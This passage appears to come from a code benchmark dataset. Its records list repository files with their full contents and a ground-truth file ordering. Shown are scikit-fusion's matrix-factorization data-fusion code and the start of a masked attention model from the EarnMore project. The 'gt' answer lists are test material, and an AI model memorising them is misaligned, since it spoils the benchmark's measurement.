        "content": "'scikit-fusion/skfusion/fusion/decomposition/dfmf.py'\n:from itertools import product\nfrom collections import defaultdict\n\nimport numpy as np\nfrom joblib import Parallel, delayed\n\nfrom ..base import FusionFit, FusionTransform\nfrom ._dfmf import dfmf, transform\n\n\n__all__ = ['Dfmf', 'DfmfTransform']\n\n\ndef parallel_dfmf_wrapper(**params):\n    return dfmf(**params)\n\n\nclass Dfmf(FusionFit):\n\n    def __init__(self, max_iter=100, init_type='random_c', n_run=1,\n                 stopping=None, stopping_system=None, verbose=0,\n                 compute_err=False, callback=None, random_state=None,\n                 n_jobs=1):\n        super(Dfmf, self).__init__()\n        self._set_params(vars())\n\n    def fuse(self, fusion_graph):\n\n        self.fusion_graph = fusion_graph\n        if not isinstance(self.random_state, np.random.RandomState):\n            self.random_state = np.random.RandomState(self.random_state)\n\n        object_types = set([ot for ot in self.fusion_graph.object_types])\n        object_type2rank = {ot: int(ot.rank) for ot in self.fusion_graph.object_types}\n\n        R, T = {}, {}\n        for row_type, col_type in product(self.fusion_graph.object_types, repeat=2):\n            for relation in self.fusion_graph.get_relations(row_type, col_type):\n                filled_data = relation.filled()\n                if relation.preprocessor:\n                    preprocessed_data = relation.preprocessor(filled_data)\n                else:\n                    preprocessed_data = filled_data\n\n                if np.ma.is_masked(preprocessed_data):\n                    data = preprocessed_data.data\n                else:\n                    data = preprocessed_data\n                X = R if relation.row_type != relation.col_type else T\n                X[relation.row_type, relation.col_type] = X.get((\n                    relation.row_type, relation.col_type), [])\n                X[relation.row_type, relation.col_type].append(data)\n\n        parallelizer = Parallel(n_jobs=self.n_jobs, max_nbytes=1e3, verbose=self.verbose)\n        task_iter = (delayed(parallel_dfmf_wrapper)(\n            R=R, Theta=T, obj_types=object_types, obj_type2rank=object_type2rank,\n            max_iter=self.max_iter, init_type=self.init_type, stopping=self.stopping,\n            stopping_system=self.stopping_system, verbose=self.verbose,\n            compute_err=self.compute_err, callback=self.callback, random_state=self.random_state,\n            n_jobs=self.n_jobs)\n                     for _ in range(self.n_run))\n        entries = parallelizer(task_iter)\n\n        self.factors_ = defaultdict(list)\n        self.backbones_ = defaultdict(list)\n        for G, S in entries:\n            for (object_type, _), factor in G.items():\n                self.factors_[object_type].append(factor)\n\n            for (row_type, col_type), backbones in S.items():\n                for i, relation in enumerate(self.fusion_graph.get_relations(row_type, col_type)):\n                    self.backbones_[relation].append(backbones[i])\n        return self\n\n\ndef parallel_dfmf_transform_wrapper(fuser, run, **params):\n    G = {(object_type, object_type): fuser.factor(object_type, run)\n         for object_type in fuser.fusion_graph.object_types}\n    S = {(relation.row_type, relation.col_type): [fuser.backbone(relation, run)]\n         for relation in fuser.fusion_graph.relations\n         if relation.row_type != relation.col_type}\n    return transform(G=G, S=S, **params)\n\n\nclass DfmfTransform(FusionTransform):\n\n    def __init__(self, max_iter=100, init_type=None, n_run=1, stopping=None,\n                 stopping_system=None, fill_value=0, verbose=0, compute_err=False,\n                 callback=None, random_state=None, n_jobs=1):\n        super(DfmfTransform, self).__init__()\n        self._set_params(vars())\n\n    def transform(self, target, fusion_graph, fuser):\n\n        self.target = target\n        self.fusion_graph = fusion_graph\n        self.fuser = fuser\n        self._validate_graph()\n\n        init_type = self.init_type if self.init_type is not None else self.fuser.init_type\n        if not isinstance(self.random_state, np.random.RandomState):\n            self.random_state = np.random.RandomState(self.random_state)\n\n        object_type2rank = {ot: int(ot.rank) for ot in self.fusion_graph.object_types}\n\n        R, T = {}, {}\n        for row_type, col_type in product(self.fusion_graph.object_types, repeat=2):\n            for relation in self.fusion_graph.get_relations(row_type, col_type):\n                if relation.preprocessor:\n                    data = relation.preprocessor(relation.data)\n                else:\n                    data = relation.data\n                if np.ma.is_masked(data):\n                    data.fill_value = self.fill_value\n                    data = data.filled()\n                data[~np.isfinite(data)] = self.fill_value\n                X = R if relation.row_type != relation.col_type else T\n                X[relation.row_type, relation.col_type] = X.get((\n                    relation.row_type, relation.col_type), [])\n                X[relation.row_type, relation.col_type].append(data)\n\n        parallelizer = Parallel(n_jobs=self.n_jobs, max_nbytes=1e3, verbose=self.verbose)\n        task_iter = (delayed(parallel_dfmf_transform_wrapper)(\n            self.fuser, run,\n            R_ij=R, Theta_i=T, target_obj_type=self.target,\n            obj_type2rank=object_type2rank, max_iter=self.max_iter, init_type=init_type,\n            stopping=self.stopping, stopping_system=self.stopping_system, verbose=self.verbose,\n            compute_err=self.compute_err, callback=self.callback, random_state=self.random_state)\n                     for run in range(self.n_run))\n        entries = parallelizer(task_iter)\n\n        self.factors_ = defaultdict(list)\n        for G_new in entries:\n            self.factors_[self.target].append(G_new)\n        return self\n\n'scikit-fusion/skfusion/fusion/decomposition/_init.py'\n:from operator import itemgetter\n\nimport numpy as np\n\n\ndef initialize(obj_types, obj_type2n_obj, obj_type2rank, R, init_typ, random_state):\n    init_types = {\"random\": _random, \"random_c\": _random_c, \"random_vcol\": _random_vcol}\n    return init_types[init_typ](obj_types, obj_type2n_obj, obj_type2rank, R, random_state)\n\n\ndef _random(obj_types, obj_type2n_obj, obj_type2rank, R, random_state):\n    G = {}\n    for obj_type in obj_types:\n        ni = obj_type2n_obj[obj_type]\n        ci = obj_type2rank[obj_type]\n        G[obj_type, obj_type] = random_state.rand(ni, ci)\n    return G\n\n\ndef _random_c(obj_types, obj_type2n_obj, obj_type2rank, R, random_state):\n    G = {}\n    for obj_type in obj_types:\n        ci = obj_type2rank[obj_type]\n        G[obj_type, obj_type] = 1e-5 * np.ones((obj_type2n_obj[obj_type], ci))\n\n        for obj_types, R12 in R.items():\n            if obj_type not in obj_types:\n                continue\n            Rij = R12 if obj_type == obj_types[0] else R12.T\n            p_c = int(.2 * Rij.shape[1])\n            l_c = int(.5 * Rij.shape[1])\n            cols_norm = [np.linalg.norm(Rij[:,i], 2) for i in range(Rij.shape[1])]\n            top_c = sorted(enumerate(cols_norm), key=itemgetter(1), reverse=True)[:l_c]\n            top_c = list(list(zip(*top_c))[0])\n            Gi = np.zeros(G[obj_type, obj_type].shape)\n            for i in range(ci):\n                random_state.shuffle(top_c)\n                Gi[:,i] = Rij[:, top_c[:p_c]].mean(axis=1)\n            G[obj_type, obj_type] += np.abs(Gi)\n\n    return G\n\n\ndef _random_vcol(obj_types, obj_type2n_obj, obj_type2rank, R, random_state):\n    G = {}\n    for obj_type in obj_types:\n        ci = obj_type2rank[obj_type]\n        G[obj_type, obj_type] = 1e-5 * np.ones((obj_type2n_obj[obj_type], ci))\n\n        for obj_types, R12 in R.items():\n            if obj_type not in obj_types:\n                continue\n            Rij = R12 if obj_type == obj_types[0] else R12.T\n            p_c = int(.2 * Rij.shape[1])\n            Gi = np.zeros(G[obj_type, obj_type].shape)\n            idx = np.arange(Rij.shape[1])\n            for i in range(ci):\n                random_state.shuffle(idx)\n                Gi[:, i] = Rij[:, idx[:p_c]].mean(axis=1)\n            G[obj_type, obj_type] += np.abs(Gi)\n    return G\n\n'scikit-fusion/skfusion/fusion/decomposition/__init__.py'\n:from .dfmf import *\nfrom .dfmc import *\n\n'scikit-fusion/skfusion/fusion/decomposition/_dfmf.py'\n:\n\nimport logging\nfrom operator import add\nfrom collections import defaultdict\nfrom functools import reduce\n\nimport numpy as np\nimport scipy.linalg as spla\nfrom joblib import Parallel, delayed\n\nfrom ._init import initialize\n\n\ndef __bdot(A, B, i, j, obj_types):\n    entry = []\n    if isinstance(list(A.values())[0], list):\n        for l in range(len(A.get((i, j), []))):\n            ll = [np.dot(A[i, k][l], B[k, j]) for k in obj_types\n                  if (i, k) in A and (k, j) in B]\n            if len(ll) > 0:\n                tmp = reduce(add, ll)\n                entry.append(np.nan_to_num(tmp))\n    elif isinstance(list(B.values())[0], list):\n        for l in range(len(B.get((i, j), []))):\n            ll = [np.dot(A[i, k], B[k, j][l]) for k in obj_types\n                  if (i, k) in A and (k, j) in B]\n            if len(ll) > 0:\n                tmp = reduce(add, ll)\n                entry.append(np.nan_to_num(tmp))\n    else:\n        ll = [np.dot(A[i, k], B[k, j]) for k in obj_types\n              if (i, k) in A and (k, j) in B]\n        if len(ll) > 0:\n            entry = reduce(add, ll)\n            entry = np.nan_to_num(entry)\n    return i, j, entry\n\n\ndef _par_bdot(A, B, obj_types, verbose, n_jobs):\n\n    parallelizer = Parallel(n_jobs=n_jobs, max_nbytes=1e3, verbose=verbose,\n                            backend=\"multiprocessing\")\n    task_iter = (delayed(__bdot)(A, B, i, j, obj_types)\n                 for i in obj_types for j in obj_types)\n    entries = parallelizer(task_iter)\n    C = {(i, j): entry for i, j, entry in entries if entry != []}\n    return C\n\n\ndef _transpose(A):\n\n    At = {k: V.T for k, V in A.items()}\n    return At\n\n\ndef count_objects(obj_types, R):\n\n    obj_type2n_obj = {}\n    for r in R:\n        i, j = r\n        for l in range(len(R[r])):\n            for ax, obj_type in enumerate([i, j]):\n                ni = obj_type2n_obj.get(obj_type, R[i,j][l].shape[ax])\n                if ni != R[i,j][l].shape[ax]:\n                    logging.critical(\"Relation matrix R_(%s,%s) dimension \"\n                                 \"mismatch\" % (i, j))\n                obj_type2n_obj[obj_type] = ni\n\n    if set(obj_types) != set(obj_type2n_obj.keys()):\n        logging.critical(\"Object type specification mismatch\")\n    return obj_type2n_obj\n\n\ndef dfmf(R, Theta, obj_types, obj_type2rank,\n         max_iter=10, init_type=\"random_vcol\", stopping=None, stopping_system=None,\n         verbose=0, compute_err=False, callback=None, random_state=None, n_jobs=1):\n    \"\"\"Data fusion by matrix factorization.\n\n    Parameters\n    ----------\n    R : dictionary of array-like objects\n        Relation matrices.\n\n    Theta : dictionary of array-like objects\n        Constraint matrices.\n\n    obj_types : array-like\n        Identifiers of object types.\n\n    obj_type2rank : dict-like\n        Factorization ranks of object types.\n\n    max_iter : int, optional (default=10)\n        Maximum number of iterations to perform.\n\n    init_type : string, optional (default=\"random_vcol\")\n        The algorithm to initialize latent matrix factors.\n\n    stopping : tuple (target_matrix, eps), optional (default=None)\n        Stopping criterion. Terminate iteration if the reconstruction\n        error of target matrix improves by less than eps.\n\n    stopping_system : float, optional (default=None)\n        Stopping criterion. Terminate iteration if the reconstruction\n        error of the fused system improves by less than eps. compute_err is\n        to True to compute the error of the fused system.\n\n    verbose : int, optional (default=0)\n         The amount of verbosity. Larger value indicates greater verbosity.\n\n    compute_err : bool, optional (default=False)\n        Compute the reconstruction error of every relation matrix if True.\n\n    callback : callable, optional\n        An optional user-supplied function to call after each iteration. Called\n        as callback(G, S, cur_iter), where S and G are current latent estimates.\n\n    random_state : int, RandomState instance or None, optional (default=None)\n        If int, random_state is the seed used by the random number generator;\n        If RandomState instance, random_state is the random number generator;\n        If None, the random number generator is the RandomState instance\n        used by np.random.\n\n    n_jobs: int (default=1)\n        Number of jobs to run in parallel\n\n    Returns\n    -------\n    G :\n    S :\n    \"\"\"\n    verbose1 = verbose\n    verbose = 50 - verbose\n    logging.basicConfig(format=\"%(asctime)s %(levelname)s: %(message)s\",\n                        datefmt=\"%m/%d/%Y %I:%M:%S %p\", level=verbose)\n\n    obj_type2n_obj = count_objects(obj_types, R)\n    R_to_init = {k: V[0] for k, V in R.items()}\n    G = initialize(obj_types, obj_type2n_obj, obj_type2rank, R_to_init,\n                   init_type, random_state)\n    S = None\n\n    if stopping:\n        err = (None, None)\n    if stopping_system:\n        err_system = (None, None)\n        compute_err = True\n\n    logging.info(\"Solving for Theta_p and Theta_n\")\n    Theta_p, Theta_n = defaultdict(list), defaultdict(list)\n    for r, thetas in Theta.items():\n        for theta in thetas:\n            t = theta > 0\n            Theta_p[r].append(np.multiply(t, theta))\n            Theta_n[r].append(np.multiply(t-1, theta))\n\n    obj = []\n\n    for iter in range(max_iter):\n        if iter > 1 and stopping and err[1]-err[0] < stopping[1]:\n            logging.info(\"Early stopping: target matrix change < %5.4f\" \\\n                      % stopping[1])\n            break\n        if iter > 1 and stopping_system and \\\n                                err_system[1]-err_system[0] < stopping_system:\n            logging.info(\"Early stopping: matrix system change < %5.4f\" \\\n                      % stopping_system)\n            break\n\n        logging.info(\"Factorization iteration: %d\" % iter)\n\n\n\n\n        pGtG = {}\n        for r in G:\n            logging.info(\"Computing GrtGr: %s\" % str(r))\n            GrtGr = np.nan_to_num(np.dot(G[r].T, G[r]))\n            pGtG[r] = spla.pinv(GrtGr)\n\n        logging.info(\"Start to update S\")\n\n        tmp1 = _par_bdot(G, pGtG, obj_types, verbose1, n_jobs)\n        tmp2 = _par_bdot(R, tmp1, obj_types, verbose1, n_jobs)\n        tmp3 = _par_bdot(_transpose(G), tmp2, obj_types, verbose1, n_jobs)\n        S = _par_bdot(pGtG, tmp3, obj_types, verbose1, n_jobs)\n\n\n\n\n        logging.info(\"Start to update G\")\n\n        G_enum = {r: np.zeros(Gr.shape) for r, Gr in G.items()}\n        G_denom = {r: np.zeros(Gr.shape) for r, Gr in G.items()}\n\n        for r in R:\n            i, j = r\n            for l in range(len(R[r])):\n                logging.info(\"Update G due to R_%s,%s^(%d)\" % (i, j, l))\n\n                tmp1 = np.dot(R[i, j][l], np.dot(G[j, j], S[i, j][l].T))\n                tmp1 = np.nan_to_num(tmp1)\n                t = tmp1 > 0\n                tmp1p = np.multiply(t, tmp1)\n                tmp1n = np.multiply(t-1, tmp1)\n\n                tmp2 = np.dot(S[i, j][l], np.dot(G[j, j].T, np.dot(G[j, j], S[i, j][l].T)))\n                tmp2 = np.nan_to_num(tmp2)\n                t = tmp2 > 0\n                tmp2p = np.multiply(t, tmp2)\n                tmp2n = np.multiply(t-1, tmp2)\n\n                tmp4 = np.dot(R[i, j][l].T, np.dot(G[i, i], S[i, j][l]))\n                tmp4 = np.nan_to_num(tmp4)\n                t = tmp4 > 0\n                tmp4p = np.multiply(t, tmp4)\n                tmp4n = np.multiply(t-1, tmp4)\n\n                tmp5 = np.dot(S[i, j][l].T, np.dot(G[i, i].T, np.dot(G[i, i], S[i, j][l])))\n                tmp5 = np.nan_to_num(tmp5)\n                t = tmp5 > 0\n                tmp5p = np.multiply(t, tmp5)\n                tmp5n = np.multiply(t-1, tmp5)\n\n                G_enum[i, i] += tmp1p + np.dot(G[i, i], tmp2n)\n                G_denom[i, i] += tmp1n + np.dot(G[i, i], tmp2p)\n\n                G_enum[j, j] += tmp4p + np.dot(G[j, j], tmp5n)\n                G_denom[j, j] += tmp4n + np.dot(G[j, j], tmp5p)\n\n        logging.info(\"Update of G due to constraint matrices\")\n        for r, thetas_p in Theta_p.items():\n            logging.info(\"Considering Theta pos. %s\" % str(r))\n            for theta_p in thetas_p:\n                G_denom[r] += np.dot(theta_p, G[r])\n        for r, thetas_n in Theta_n.items():\n            logging.info(\"Considering Theta neg. %s\" % str(r))\n            for theta_n in thetas_n:\n                G_enum[r] += np.dot(theta_n, G[r])\n\n        for r in G:\n            G[r] = np.multiply(G[r], np.sqrt(\n                np.divide(G_enum[r], np.maximum(G_denom[r], np.finfo(np.float).eps))))\n\n\n\n\n        if stopping:\n            target, eps = stopping\n            err = (np.linalg.norm(R[target]-np.dot(G[target[0],target[0]],\n                    np.dot(S[target], G[target[1],target[1]].T))), err[0])\n\n        if compute_err:\n            s = 0\n            for r in R:\n                i, j = r\n                for l in range(len(R[r])):\n                    Rij_app = np.dot(G[i, i], np.dot(S[i, j][l], G[j, j].T))\n                    r_err = np.linalg.norm(R[r][l]-Rij_app, \"fro\")\n                    logging.info(\"Relation R_%s,%s^(%d) norm difference: \" \\\n                              \"%5.4f\" % (i, j, l, r_err))\n                    s += r_err\n            logging.info(\"Error (objective function value): %5.4f\" % s)\n            obj.append(s)\n            if stopping_system:\n                err_system = (s, err_system[0])\n\n        if callback:\n            callback(G, S, iter)\n\n    if compute_err:\n        logging.info(\"Violations of optimization objective: %d/%d \" % (\n            int(np.sum(np.diff(obj) > 0)), len(obj)))\n    return G, S\n\n\ndef transform(R_ij, Theta_i, target_obj_type, obj_type2rank, G, S,\n              max_iter=10, init_type=\"random_c\",\n              stopping=None, stopping_system=None, verbose=0,\n              compute_err=False, callback=None, random_state=None):\n    verbose = 50 - verbose\n    logging.basicConfig(format=\"%(asctime)s %(levelname)s: %(message)s\",\n                        datefmt=\"%m/%d/%Y %I:%M:%S %p\", level=verbose)\n    if isinstance(random_state, np.random.RandomState):\n        random_state = random_state\n    else:\n        random_state = np.random.RandomState(random_state)\n\n    n_targets = [R_ij[i,j][0].shape[0 if target_obj_type == i else 1] for i, j in R_ij]\n    if len(set(n_targets)) > 1:\n        logging.critical(\"Target object type: %s size mismatch\" % target_obj_type)\n    n_targets = n_targets[0]\n    R_to_init = {k: V[0] for k, V in R_ij.items()}\n    Gx = initialize(\n        [target_obj_type], {target_obj_type: n_targets}, obj_type2rank,\n        R_to_init, init_type, random_state)\n    G_i = Gx[target_obj_type, target_obj_type]\n\n    if stopping:\n        err = (None, None)\n    if stopping_system:\n        err_system = (None, None)\n        compute_err = True\n\n    Theta_p, Theta_n = [], []\n    for r, thetas in Theta_i.items():\n        for theta in thetas:\n            t = theta > 0\n            Theta_p.append(np.multiply(t, theta))\n            Theta_n.append(np.multiply(t-1, theta))\n\n    obj = []\n\n    for iter in range(max_iter):\n        if iter > 1 and stopping and abs(err[1]-err[0]) < stopping[1]:\n            logging.info(\"Early stopping: target matrix change < %5.4f\" \\\n                      % stopping[1])\n            break\n        if iter > 1 and stopping_system and \\\n                                err_system[1]-err_system[0] < stopping_system:\n            logging.info(\"Early stopping: matrix system change < %5.4f\" \\\n                      % stopping_system)\n            break\n\n        logging.info(\"Factorization iteration: %d\" % iter)\n\n\n\n\n        logging.info(\"Start to update G\")\n\n        G_enum = np.zeros(G_i.shape)\n        G_denom = np.zeros(G_i.shape)\n\n        for r in R_ij:\n            i, j = r\n            for l in range(len(R_ij[r])):\n                logging.info(\"Update G due to R_%s,%s^(%d)\" % (i, j, l))\n                if i is target_obj_type:\n\n                    tmp1 = np.dot(R_ij[i, j][l], np.dot(G[j, j], S[i, j][l].T))\n                    t = tmp1 > 0\n                    tmp1p = np.multiply(t, tmp1)\n                    tmp1n = np.multiply(t-1, tmp1)\n\n                    tmp2 = np.dot(S[i, j][l], np.dot(G[j, j].T, np.dot(G[j, j], S[i, j][l].T)))\n                    t = tmp2 > 0\n                    tmp2p = np.multiply(t, tmp2)\n                    tmp2n = np.multiply(t-1, tmp2)\n\n                    G_enum += tmp1p + np.dot(G_i, tmp2n)\n                    G_denom += tmp1n + np.dot(G_i, tmp2p)\n\n                if j is target_obj_type:\n                    tmp4 = np.dot(R_ij[i, j][l].T, np.dot(G[i, i], S[i, j][l]))\n                    t = tmp4 > 0\n                    tmp4p = np.multiply(t, tmp4)\n                    tmp4n = np.multiply(t-1, tmp4)\n\n                    tmp5 = np.dot(S[i, j][l].T, np.dot(G[i, i].T, np.dot(G[i, i], S[i, j][l])))\n                    t = tmp5 > 0\n                    tmp5p = np.multiply(t, tmp5)\n                    tmp5n = np.multiply(t-1, tmp5)\n\n                    G_enum += tmp4p + np.dot(G_i, tmp5n)\n                    G_denom += tmp4n + np.dot(G_i, tmp5p)\n\n        logging.info(\"Update of G due to constraint matrices\")\n        for theta_p in Theta_p:\n            G_denom += np.dot(theta_p, G_i)\n        for theta_n in Theta_n:\n            G_enum += np.dot(theta_n, G_i)\n\n        G_i = np.multiply(G_i, np.sqrt(\n            np.divide(G_enum, np.maximum(G_denom, np.finfo(np.float).eps))))\n\n\n\n\n        if compute_err:\n            s = 0\n            for r in R_ij:\n                i, j = r\n                for l in range(len(R_ij[r])):\n                    if i is target_obj_type:\n                        Rij_app = np.dot(G_i, np.dot(S[i, j][l], G[j, j].T))\n                        r_err = np.linalg.norm(R_ij[r][l]-Rij_app, \"fro\")\n                    if j is target_obj_type:\n                        Rij_app = np.dot(G[i, i], np.dot(S[i, j][l], G_i.T))\n                        r_err = np.linalg.norm(R_ij[r][l]-Rij_app, \"fro\")\n                    logging.info(\"Relation R_%s,%s^(%d) norm difference: \" \\\n                          \"%5.4f\" % (i, j, l, r_err))\n                    s += r_err\n            logging.info(\"Error (objective function value): %5.4f\" % s)\n            obj.append(s)\n            if stopping_system:\n                err_system = (s, err_system[0])\n\n        if callback:\n            callback(G_i, iter)\n\n    if compute_err:\n        logging.info(\"Violations of optimization objective: %d/%d \" % (\n            int(np.sum(np.diff(obj) > 0)), len(obj)))\n    return G_i\n\n\nif 0:\n\n    obj_types = [0, 1, 2]\n    n1, n2, n3 = 400, 80, 264\n    c1, c2, c3 = 30, 40, 50\n    obj_type2rank = {0: c1, 1: c2, 2: c3}\n\n    rnds = np.random.RandomState(0)\n\n    R12 = 5 * rnds.rand(n1, n2)\n    R13 = 20 * rnds.rand(n1, n3)\n    R21 = R12.T\n    R23 = 20 * rnds.rand(n2, n3)\n\n    Theta = {}\n    R = {(0, 1): [R12], (0, 2): [R13], (1, 2): [R23], (1, 0): [R21]}\n    print(\"Inference\")\n    G, S = dfmf(\n        R, Theta, obj_types, obj_type2rank, verbose=0, max_iter=10,\n        init_type=\"random\", compute_err=True, random_state=rnds)\n\n\n    o_n2_z3 = 20 * rnds.rand(3, n3)\n    o_n2_z1 = 5 * rnds.rand(3, n1)\n\n    print(\"We got some new data!\")\n    x_G2 = transform(\n        {(1,0): [o_n2_z1], (0,1): [o_n2_z1.T], (1,2): [o_n2_z3]}, {},\n        1, obj_type2rank, G, S, max_iter=10, init_type=\"random\",\n        compute_err=True, stopping=None, random_state=rnds)\n\n    R12_hat = np.dot(G[0,0], np.dot(S[0,1][0], G[1,1].T))\n    R21_hat = np.dot(G[1,1], np.dot(S[1,0][0], G[0,0].T))\n    R23_hat = np.dot(G[1,1], np.dot(S[1,2][0], G[2,2].T))\n\n    x_R12_hat = np.dot(G[0,0], np.dot(S[0,1][0], x_G2.T))\n    x_R21_hat = np.dot(x_G2, np.dot(S[1,0][0], G[0,0].T))\n    x_R23_hat = np.dot(x_G2, np.dot(S[1,2][0], G[2,2].T))\n\n    err = np.linalg.norm(R23[0, :] - R23_hat[0, :])\n    print(\"Error in R23 of object that existed before: %5.3f\" % err)\n    x_err = np.linalg.norm((o_n2_z3 - x_R23_hat)[0, :])\n    print(\"Error in R23 of newly added object: %5.3f\" % x_err)\n\n    err = np.linalg.norm(R12[:, -1] - R12_hat[:, -1])\n    print(\"Error in R12 of object that existed before: %5.3f\" % err)\n    x_err = np.linalg.norm((x_R12_hat - o_n2_z1.T)[:, 0])\n    print(\"Error in R12 of newly added object: %5.3f\" % x_err)\n\n    err = np.linalg.norm(R21[0, :] - R21_hat[0, :])\n    print(\"Error in R21 of object that existed before: %5.3f\" % err)\n    x_err = np.linalg.norm((x_R21_hat - o_n2_z1)[0, :])\n    print(\"Error in R21 of newly added object: %5.3f\" % x_err)\n",
        "gt": [
            "'scikit-fusion/skfusion/fusion/decomposition/_init.py'",
            "'scikit-fusion/skfusion/fusion/decomposition/_dfmf.py'",
            "'scikit-fusion/skfusion/fusion/decomposition/dfmf.py'",
            "'scikit-fusion/skfusion/fusion/decomposition/__init__.py'"
        ]
    },
    {
        "files": [
            "'EarnMore/pm/net/mask_time_state.py'",
            "'EarnMore/pm/net/sac/__init__.py'",
            "'EarnMore/pm/net/__init__.py'",
            "'EarnMore/pm/net/sac/mask_sac_net.py'"
        ],
        "content": "'EarnMore/pm/net/mask_time_state.py'\n:import torch\nfrom typing import List\nfrom functools import partial\nfrom pm.registry import NET\nfrom pm.net import MAE\nfrom einops import rearrange, repeat\nfrom typing import Final, Set, Optional, Union, Tuple\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom timm.layers import Mlp, DropPath, use_fused_attn\n\n\nclass LayerScale(nn.Module):\n    def __init__(self, dim, init_values=1e-5, inplace=False):\n        super().__init__()\n        self.inplace = inplace\n        self.gamma = nn.Parameter(init_values * torch.ones(dim))\n\n    def forward(self, x):\n        return x.mul_(self.gamma) if self.inplace else x * self.gamma\n\n\nclass CrossAttention(nn.Module):\n    fused_attn: Final[bool]\n\n    def __init__(\n            self,\n            dim,\n            num_heads=8,\n            qkv_bias=False,\n            qk_norm=False,\n            attn_drop=0.,\n            proj_drop=0.,\n            norm_layer=nn.LayerNorm,\n    ):\n        super().__init__()\n        assert dim % num_heads == 0, 'dim should be divisible by num_heads'\n        self.num_heads = num_heads\n        self.head_dim = dim // num_heads\n        self.scale = self.head_dim ** -0.5\n        self.fused_attn = use_fused_attn()\n\n\n        self.q_linear = nn.Linear(dim, dim, bias=qkv_bias)\n        self.k_linear = nn.Linear(dim, dim, bias=qkv_bias)\n        self.v_linear = nn.Linear(dim, dim, bias=qkv_bias)\n        self.q_norm = norm_layer(self.head_dim) if qk_norm else nn.Identity()\n        self.k_norm = norm_layer(self.head_dim) if qk_norm else nn.Identity()\n        self.attn_drop = nn.Dropout(attn_drop)\n        self.proj = nn.Linear(dim, dim)\n        self.proj_drop = nn.Dropout(proj_drop)\n\n    def forward(self, q, k, v):\n        B, N, C = q.shape\n        q = self.q_linear(q)\n        k = self.k_linear(k)\n        v = self.v_linear(v)\n        q, k = self.q_norm(q), self.k_norm(k)\n\n        if self.fused_attn:\n            x = F.scaled_dot_product_attention(\n                q, k, v,\n                dropout_p=self.attn_drop.p,\n            )\n        else:\n            q = q * self.scale\n            attn = q @ k.transpose(-2, -1)\n            attn = attn.softmax(dim=-1)\n            attn = self.attn_drop(attn)\n            x = attn @ v\n\n        x = x.transpose(1, 2).reshape(B, N, C)\n        x = self.proj(x)\n        x = self.proj_drop(x)\n        return x\n\nclass CrossBlock(nn.Module):\n\n    def __init__(\n            self,\n            dim,\n            num_heads,\n            mlp_ratio=4.,\n            qkv_bias=False,\n            qk_norm=False,\n            proj_drop=0.,\n            attn_drop=0.,\n            init_values=None,\n            drop_path=0.,\n            act_layer=nn.GELU,\n            norm_layer=nn.LayerNorm,\n            mlp_layer=Mlp,\n    ):\n        super().__init__()\n        self.norm1 = norm_layer(dim)\n        self.attn = CrossAttention(\n            dim,\n            num_heads=num_heads,\n            qkv_bias=qkv_bias,\n            qk_norm=qk_norm,\n            attn_drop=attn_drop,\n            proj_drop=proj_drop,\n            norm_layer=norm_layer,\n        )\n        self.ls1 = LayerScale(dim, init_values=init_values) if init_values else nn.Identity()\n        self.drop_path1 = DropPath(drop_path) if drop_path > 0. else nn.Identity()\n\n        self.norm2 = norm_layer(dim)\n        self.mlp = mlp_layer(\n            in_features=dim,\n            hidden_features=int(dim * mlp_ratio),\n            act_layer=act_layer,\n            drop=proj_drop,\n        )\n        self.ls2 = LayerScale(dim, init_values=init_values) if init_values else nn.Identity()\n        self.drop_path2 = DropPath(drop_path) if drop_path > 0. else nn.Identity()\n\n    def forward(self, q, k, v):\n        q = q + self.drop_path1(self.ls1(self.attn(self.norm1(q), k, v)))\n        q = q + self.drop_path2(self.ls2(self.mlp(self.norm2(q))))\n        return q\n\n@NET.register_module(force=True)\nclass MaskTimeState(MAE):\n    def __init__(self,\n                *args,\n                embed_type: str = \"TimesEmbed\",\n                feature_size: List[int] = (10, 99),\n                patch_size: List[int] = (10, 99),\n                t_patch_size: int = 1,\n                num_stocks: int = 420,\n                pred_num_stocks: int = 420,\n                in_chans: int = 1,\n                embed_dim: int = 128,\n                depth: int = 2,\n                num_heads: int = 4,\n                decoder_embed_dim: int = 64,\n                decoder_depth: int = 1,\n                decoder_num_heads: int = 8,\n                mlp_ratio: float = 4.0,\n                norm_layer: nn.LayerNorm = partial(nn.LayerNorm, eps=1e-6),\n                norm_pix_loss: bool = False,\n                cls_embed: bool = True,\n                sep_pos_embed: bool = True,\n                trunc_init: bool = False,\n                no_qkv_bias: bool = False,\n                mask_ratio_min: float = 0.5,\n                mask_ratio_max: float = 1.0,\n                mask_ratio_mu: float = 0.55,\n                mask_ratio_std:float = 0.25,\n                ** kwargs\n                ):\n        super(MaskTimeState, self).__init__(\n            *args,\n            embed_type=embed_type,\n            feature_size = feature_size,\n            patch_size = patch_size,\n            t_patch_size = t_patch_size,\n            num_stocks = num_stocks,\n            pred_num_stocks = pred_num_stocks,\n            in_chans = in_chans,\n            embed_dim = embed_dim,\n            depth = depth,\n            num_heads = num_heads,\n            decoder_embed_dim = decoder_embed_dim,\n            decoder_depth = decoder_depth,\n            decoder_num_heads = decoder_num_heads,\n            mlp_ratio = mlp_ratio,\n            norm_layer = norm_layer,\n            norm_pix_loss = norm_pix_loss,\n            cls_embed = cls_embed,\n            sep_pos_embed = sep_pos_embed,\n            trunc_init = trunc_init,\n            no_qkv_bias = no_qkv_bias,\n            mask_ratio_min = mask_ratio_min,\n            mask_ratio_max = mask_ratio_max,\n            mask_ratio_mu = mask_ratio_mu,\n            mask_ratio_std = mask_ratio_std,\n            **kwargs,\n        )\n\n        self.decoder_blocks = nn.ModuleList(\n            [\n                CrossBlock(\n                    decoder_embed_dim,\n                    decoder_num_heads,\n                    mlp_ratio,\n                    qkv_bias=not no_qkv_bias,\n                    norm_layer=norm_layer,\n                )\n                for i in range(decoder_depth)\n            ]\n        )\n\n        self.initialize_weights()\n\n    def initialize_weights(self):\n        if self.cls_embed:\n            torch.nn.init.trunc_normal_(self.cls_token, std=0.02)\n        if self.sep_pos_embed:\n            torch.nn.init.trunc_normal_(self.pos_embed_spatial, std=0.02)\n            torch.nn.init.trunc_normal_(self.pos_embed_temporal, std=0.02)\n\n            torch.nn.init.trunc_normal_(self.decoder_pos_embed_spatial, std=0.02)\n            torch.nn.init.trunc_normal_(self.decoder_pos_embed_temporal, std=0.02)\n\n            if self.cls_embed:\n                torch.nn.init.trunc_normal_(self.pos_embed_class, std=0.02)\n                torch.nn.init.trunc_normal_(self.decoder_pos_embed_class, std=0.02)\n        else:\n            torch.nn.init.trunc_normal_(self.pos_embed, std=0.02)\n            torch.nn.init.trunc_normal_(self.decoder_pos_embed, std=0.02)\n\n        if getattr(self.patch_embed, \"proj\", None) is not 